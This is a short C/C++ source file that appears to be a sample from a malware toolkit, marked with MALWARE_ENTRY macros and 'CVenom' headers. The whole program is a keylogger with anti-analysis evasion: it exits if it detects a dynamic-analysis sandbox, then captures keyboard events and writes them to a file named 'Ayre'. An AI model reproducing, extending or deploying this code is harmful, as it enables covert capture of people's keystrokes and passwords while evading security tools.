#include "../CVenom.h"
#include "../EvasionTools.h"
#include "../KeyboardTools.h"
int main(MALWARE_ENTRY){
	cvinit(MALWARE_INIT);
	KeyboardTools Keyboard;
	EvasionTools Evador;

	if(Evador.CheckDynamicAnalysis() > 0)
		cvexit(MALWARE_EXIT);

	Keyboard.GetEventFile();
	Keyboard.OutputTo("Ayre");
	Keyboard.Run();

	cvexit(MALWARE_EXIT);
}
